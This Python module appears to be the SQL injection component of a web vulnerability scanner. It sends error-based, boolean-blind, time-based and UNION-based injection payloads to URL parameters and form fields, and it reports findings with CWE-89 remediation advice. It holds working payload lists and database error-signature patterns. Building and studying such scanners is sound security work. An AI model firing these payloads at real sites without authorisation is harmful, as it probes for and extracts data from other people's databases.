from __future__ import annotations

import asyncio
import re
import time
from typing import Any
from urllib.parse import parse_qs, urlparse

import httpx
import structlog

from ..core.base_scanner import BaseScanner
from ..models.enums import Severity, VulnType
from ..models.finding import Finding
from ..utils.form_utils import extract_forms
from ..utils.url_utils import inject_param

logger = structlog.get_logger(__name__)

# Error-based SQLi detection patterns
SQLI_ERROR_PATTERNS = re.compile(
    r"(mysql_fetch|you have an error in your sql|ora-\d{5}|"
    r"pg::syntaxerror|sqlite3\.operationalerror|"
    r"unclosed quotation mark|microsoft ole db|"
    r"syntax error.*near|quoted string not properly terminated|"
    r"invalid query|sql syntax.*mysql|warning.*mysql|"
    r"mysqlclient|psycopg2|com\.mysql\.jdbc)",
    re.IGNORECASE,
)

SLEEP_PAYLOADS = [
    ("'; SELECT SLEEP(5)-- ", "mysql"),
    ("'; WAITFOR DELAY '0:0:5'-- ", "mssql"),
    ("' OR SLEEP(5)-- ", "mysql"),
    ("1; SELECT SLEEP(5)-- ", "mysql"),
    ("' AND SLEEP(5)-- ", "mysql"),
]

# Basic SQLi error payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1'-- -",
    "1 AND 1=CONVERT(int, @@version)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
    "' OR 1=1--",
    "\" OR \"\"=\"",
    "' AND 1=2--",
]


class SQLiScanner(BaseScanner):
    """SQL injection scanner implementing error-based, boolean-blind,
    time-based, and union-based techniques."""

    async def scan(self, url: str) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # ── URL query parameters ──────────────────────────────────────────────
        for param_name in params:
            # 1. Error-based
            error_findings = await self._error_based(url, param_name)
            findings.extend(error_findings)
            if error_findings:
                continue

            # 2. Boolean-blind
            blind_findings = await self._boolean_blind(url, param_name)
            findings.extend(blind_findings)
            if blind_findings:
                continue

            # 3. Time-based blind
            time_findings = await self._time_based(url, param_name)
            findings.extend(time_findings)
            if time_findings:
                continue

            # 4. Union-based (only if no other finding)
            union_findings = await self._union_based(url, param_name)
            findings.extend(union_findings)

        # ── HTML form parameters (GET + POST) ─────────────────────────────────
        form_findings = await self._scan_forms(url)
        findings.extend(form_findings)

        return findings

    # ── 1. Error-based ────────────────────────────────────────────────────────

    async def _error_based(self, url: str, param: str) -> list[Finding]:
        findings: list[Finding] = []
        for payload in ERROR_PAYLOADS:
            try:
                test_url = inject_param(url, param, payload)
                resp = await self._request("GET", test_url, follow_redirects=True)
                body = resp.text[:8000]
                match = SQLI_ERROR_PATTERNS.search(body)
                if match:
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=body[max(0, match.start() - 50): match.end() + 100].strip(),
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings."
                        ),
                    )
                    if await self._confirm_finding(finding):
                        findings.append(finding)
                        logger.info(
                            "sqli_error_based_found",
                            url=url,
                            param=param,
                            pattern=match.group(0)[:60],
                        )
                        return findings
            except (httpx.TimeoutException, httpx.ConnectError, Exception) as exc:
                logger.debug("sqli_error_based_request_failed", url=url, error=str(exc))
        return findings

    # ── 2. Boolean-blind ──────────────────────────────────────────────────────

    async def _boolean_blind(self, url: str, param: str) -> list[Finding]:
        """
        2x consistency check across multiple payload pairs (string + numeric context).

        A real boolean-blind shows low internal variance within TRUE/FALSE groups
        but a large gap between them. Dynamic pages (CSRF tokens, timestamps) produce
        high internal variance, so they're rejected.
        """
        payload_pairs = [
            ("' AND 1=1-- ", "' AND 1=2-- "),          # string context
            ("1 AND 1=1-- ", "1 AND 1=2-- "),           # numeric context
            ('" AND "1"="1"-- ', '" AND "1"="2"-- '),   # double-quote string
        ]
        for true_payload, false_payload in payload_pairs:
            result = await self._boolean_blind_pair(url, param, true_payload, false_payload)
            if result:
                return [result]
        return []

    async def _boolean_blind_pair(
        self, url: str, param: str, true_payload: str, false_payload: str
    ) -> Finding | None:
        try:
            rt1 = await self._request("GET", inject_param(url, param, true_payload))
            rt2 = await self._request("GET", inject_param(url, param, true_payload))
            rf1 = await self._request("GET", inject_param(url, param, false_payload))
            rf2 = await self._request("GET", inject_param(url, param, false_payload))

            t1, t2 = len(rt1.text), len(rt2.text)
            f1, f2 = len(rf1.text), len(rf2.text)

            t_avg = (t1 + t2) / 2
            f_avg = (f1 + f2) / 2
            diff = abs(t_avg - f_avg)
            min_diff = max(200, int(max(t_avg, f_avg) * 0.15))

            var_true  = abs(t1 - t2)
            var_false = abs(f1 - f2)
            max_var   = max(50, int(diff * 0.08))

            if diff >= min_diff and var_true <= max_var and var_false <= max_var:
                logger.info(
                    "sqli_boolean_blind_found",
                    url=url,
                    param=param,
                    diff=diff,
                    threshold=min_diff,
                )
                return Finding(
                    vuln_type=VulnType.SQLI,
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=true_payload,
                    evidence=(
                        f"Boolean blind SQLi: TRUE≈{t_avg:.0f}B, FALSE≈{f_avg:.0f}B "
                        f"(diff={diff:.0f}B, threshold={min_diff}B, "
                        f"variance={var_true}/{var_false})"
                    ),
                    cvss_score=9.8,
                    cwe_id="CWE-89",
                    owasp_ref="A03:2021",
                    remediation="Use parameterized queries / prepared statements.",
                )
        except Exception as exc:
            logger.debug("sqli_boolean_blind_failed", url=url, error=str(exc))
        return None

    # ── 3. Time-based blind ───────────────────────────────────────────────────

    async def _time_based(self, url: str, param: str) -> list[Finding]:
        # Establish baseline with 3 clean requests
        baselines: list[float] = []
        try:
            clean_url = inject_param(url, param, "1")
            for _ in range(3):
                t0 = time.monotonic()
                await self._request("GET", clean_url)
                baselines.append(time.monotonic() - t0)
        except Exception:
            return []

        baseline = sum(baselines) / len(baselines)

        for payload, db_type in SLEEP_PAYLOADS:
            try:
                test_url = inject_param(url, param, payload)
                t0 = time.monotonic()
                await self._request("GET", test_url, timeout=15)
                elapsed = time.monotonic() - t0

                if elapsed > baseline + 4.5:
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=(
                            f"Time-based blind ({db_type}): response={elapsed:.2f}s, "
                            f"baseline={baseline:.2f}s"
                        ),
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation=(
                            "Use parameterized queries / prepared statements."
                        ),
                    )
                    logger.info(
                        "sqli_time_based_found",
                        url=url,
                        param=param,
                        elapsed=elapsed,
                        baseline=baseline,
                    )
                    return [finding]
            except httpx.TimeoutException:
                # A timeout may itself indicate a sleep injection worked
                elapsed = time.monotonic() - t0  # type: ignore[possibly-undefined]
                if elapsed > baseline + 4.5:
                    finding = Finding(
                        vuln_type=VulnType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=(
                            f"Time-based blind (timeout after {elapsed:.1f}s, "
                            f"baseline={baseline:.2f}s)"
                        ),
                        cvss_score=9.8,
                        cwe_id="CWE-89",
                        owasp_ref="A03:2021",
                        remediation="Use parameterized queries / prepared statements.",
                    )
                    return [finding]
            except Exception as exc:
                logger.debug("sqli_time_based_request_failed", url=url, error=str(exc))

        return []

    # ── 4. Union-based ────────────────────────────────────────────────────────

    async def _union_based(self, url: str, param: str) -> list[Finding]:
        """Determine column count then attempt to extract DB version.

        False-positive guard: any version-like strings already present on the
        clean page (jQuery, Bootstrap, etc.) are subtracted from matches so that
        only NEW strings introduced by the UNION payload are flagged.
        """
        col_count = await self._find_column_count(url, param)
        if col_count == 0:
            return []

        # Collect version strings that already exist on the clean page
        try:
            baseline_resp = await self._request("GET", inject_param(url, param, "1"))
            baseline_versions: set[str] = set(
                re.findall(r"\b\d+\.\d+[\.\d]*\b", baseline_resp.text[:4000])
            )
        except Exception:
            baseline_versions = set()

        null_cols = ["NULL"] * col_count
        for i in range(col_count):
            null_cols[i] = "@@version"
            payload = f"' UNION SELECT {','.join(null_cols)}-- "
            null_cols[i] = "NULL"
            try:
                test_url = inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                body = resp.text[:4000]

                # Find all version-like strings in UNION response
                found_versions = set(re.findall(r"\b\d+\.\d+[\.\d]*\b", body))
                # Only flag strings that were NOT already present on the clean page
                new_versions = found_versions - baseline_versions
                if not new_versions:
                    continue

                # Prefer strings that look like DB server versions (5.7.x, 8.0.x, etc.)
                evidence_ver = sorted(new_versions, key=len, reverse=True)[0]
                finding = Finding(
                    vuln_type=VulnType.SQLI,
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence=(
                        f"UNION-based SQLi — new version string in response: "
                        f"{evidence_ver!r} (col {i + 1}/{col_count})"
                    ),
                    cvss_score=9.8,
                    cwe_id="CWE-89",
                    owasp_ref="A03:2021",
                    remediation="Use parameterized queries / prepared statements.",
                )
                logger.info("sqli_union_based_found", url=url, param=param,
                            cols=col_count, version=evidence_ver)
                return [finding]
            except Exception as exc:
                logger.debug("sqli_union_based_failed", url=url, error=str(exc))

        return []

    async def _find_column_count(self, url: str, param: str) -> int:
        """Use ORDER BY to find the number of columns."""
        for n in range(1, 21):
            payload = f"' ORDER BY {n}-- "
            try:
                test_url = inject_param(url, param, payload)
                resp = await self._request("GET", test_url)
                if SQLI_ERROR_PATTERNS.search(resp.text[:3000]):
                    return n - 1
            except Exception:
                break
        return 0

    # ── Form-based SQLi (GET + POST forms) ────────────────────────────────────

    async def _scan_forms(self, url: str) -> list[Finding]:
        """Fetch the page, extract HTML forms, and test each injectable field."""
        findings: list[Finding] = []
        try:
            resp = await self._request("GET", url, follow_redirects=True)
            forms = extract_forms(resp.text, url)
        except Exception:
            return findings

        for form in forms:
            action = form["action"]
            method = form["method"]
            base_data = form["inputs"]
            injectable = form["injectable"]

            for field in injectable:
                # Error-based first (fastest confirmation)
                for payload in ERROR_PAYLOADS:
                    data = {**base_data, field: payload}
                    try:
                        if method == "POST":
                            r = await self._request(
                                "POST", action, data=data, follow_redirects=True
                            )
                        else:
                            r = await self._request(
                                "GET", action, params=data, follow_redirects=True
                            )
                        body = r.text[:8000]
                        match = SQLI_ERROR_PATTERNS.search(body)
                        if match:
                            finding = Finding(
                                vuln_type=VulnType.SQLI,
                                severity=Severity.CRITICAL,
                                url=action,
                                parameter=field,
                                payload=payload,
                                evidence=body[
                                    max(0, match.start() - 50): match.end() + 100
                                ].strip(),
                                cvss_score=9.8,
                                cwe_id="CWE-89",
                                owasp_ref="A03:2021",
                                remediation=(
                                    "Use parameterized queries / prepared statements. "
                                    "Never concatenate user input into SQL strings."
                                ),
                            )
                            logger.info(
                                "sqli_form_error_based_found",
                                url=action,
                                field=field,
                                method=method,
                            )
                            findings.append(finding)
                            break
                    except Exception as exc:
                        logger.debug("sqli_form_failed", url=action, error=str(exc))

                if findings:
                    break  # one finding per form

                # Boolean-blind fallback (string + numeric)
                for true_p, false_p in [
                    ("' AND 1=1-- ", "' AND 1=2-- "),
                    ("1 AND 1=1-- ", "1 AND 1=2-- "),
                ]:
                    finding = await self._form_boolean_blind(
                        action, method, base_data, field, true_p, false_p
                    )
                    if finding:
                        findings.append(finding)
                        break

                if findings:
                    break

        return findings

    async def _form_boolean_blind(
        self,
        action: str,
        method: str,
        base_data: dict[str, str],
        field: str,
        true_payload: str,
        false_payload: str,
    ) -> Finding | None:
        try:
            def _make_data(p: str) -> dict[str, str]:
                return {**base_data, field: p}

            async def _req(p: str) -> int:
                data = _make_data(p)
                if method == "POST":
                    r = await self._request("POST", action, data=data, follow_redirects=True)
                else:
                    r = await self._request("GET", action, params=data, follow_redirects=True)
                return len(r.text)

            t1, t2 = await _req(true_payload), await _req(true_payload)
            f1, f2 = await _req(false_payload), await _req(false_payload)

            t_avg = (t1 + t2) / 2
            f_avg = (f1 + f2) / 2
            diff = abs(t_avg - f_avg)
            min_diff = max(200, int(max(t_avg, f_avg) * 0.15))
            var_true  = abs(t1 - t2)
            var_false = abs(f1 - f2)
            max_var   = max(50, int(diff * 0.08))

            if diff >= min_diff and var_true <= max_var and var_false <= max_var:
                logger.info(
                    "sqli_form_boolean_blind_found",
                    url=action,
                    field=field,
                    diff=diff,
                )
                return Finding(
                    vuln_type=VulnType.SQLI,
                    severity=Severity.CRITICAL,
                    url=action,
                    parameter=field,
                    payload=true_payload,
                    evidence=(
                        f"Form boolean blind SQLi ({method}): "
                        f"TRUE≈{t_avg:.0f}B, FALSE≈{f_avg:.0f}B "
                        f"(diff={diff:.0f}B, threshold={min_diff}B)"
                    ),
                    cvss_score=9.8,
                    cwe_id="CWE-89",
                    owasp_ref="A03:2021",
                    remediation="Use parameterized queries / prepared statements.",
                )
        except Exception as exc:
            logger.debug("sqli_form_boolean_blind_failed", url=action, error=str(exc))
        return None
